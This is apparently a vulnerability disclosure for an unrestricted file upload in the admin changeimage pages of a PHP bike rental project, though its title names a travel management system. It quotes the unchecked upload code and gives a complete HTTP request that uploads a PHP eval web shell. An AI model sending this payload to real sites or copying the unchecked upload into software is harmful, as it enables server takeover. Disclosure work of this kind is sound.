# Travel Management System has File upload vulnerability in /admin/changeimage*.php



## supplier



https://code-projects.org/online-bike-rental-system-using-php-source-code/



## Vulnerability file



/admin/changeimage1.php、/admin/changeimage2.php、/admin/changeimage3.php、/admin/changeimage4.php、/admin/changeimage5.php

The above vulnerability files all have the same issue, and the source code of the vulnerabilities is the samel.

## describe



All files in changeimage *. php have incomplete identification of upload file variables. Hackers can directly upload files with any extension. If the content of the file contains malicious content, it may result in the loss of server permissions.

## **Code analysis**

```
<?php
session_start();
error_reporting(0);
include('includes/config.php');
if(strlen($_SESSION['alogin'])==0)
	{
header('location:index.php');
}
else{
// Code for change password
if(isset($_POST['update']))
{
$vimage=$_FILES["img4"]["name"];
$id=intval($_GET['imgid']);
move_uploaded_file($_FILES["img4"]["tmp_name"],"img/vehicleimages/".$_FILES["img4"]["name"]);
$sql="update tblvehicles set Vimage4=:vimage where id=:id";
$query = $dbh->prepare($sql);
$query->bindParam(':vimage',$vimage,PDO::PARAM_STR);
$query->bindParam(':id',$id,PDO::PARAM_STR);
$query->execute();

$msg="Image updated successfully";



}
?>
```

###### Using the "move_uploaded_file" function, there is no restriction on the type of file upload, which allows malicious files to be uploaded directly by modifying the file extension.

**The above vulnerability files all have the same issue, and the source code of the vulnerabilities is the same. Only one file is listed here for explanation.**

## POC1

```
POST /admin/changeimage4.php HTTP/1.1
Host: 192.168.20.133
Content-Length: 300
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.20.133
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylqS5FsBlhpjSeIev
User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.20.133/admin/changeimage4.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=4rinhnbm4u05201jo2fh4fnkc6
sec-ch-ua-platform: "Android"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="125", "Google Chrome";v="125"
sec-ch-ua-mobile: ?1
Connection: keep-alive

------WebKitFormBoundarylqS5FsBlhpjSeIev
Content-Disposition: form-data; name="img4"; filename="2.php"
Content-Type: image/jpeg

<?php @eval($_POST['1']); ?>
------WebKitFormBoundarylqS5FsBlhpjSeIev
Content-Disposition: form-data; name="update"


------WebKitFormBoundarylqS5FsBlhpjSeIev--

```

![image-20250106185502284](https://github.com/Huandtx/cve/blob/main/cve/Online%20Bike%20Rental%20System/image-20250106185502284.png)

![image-20250106185656436](https://github.com/Huandtx/cve/blob/main/cve/Online%20Bike%20Rental%20System/image-20250106185656436.png)

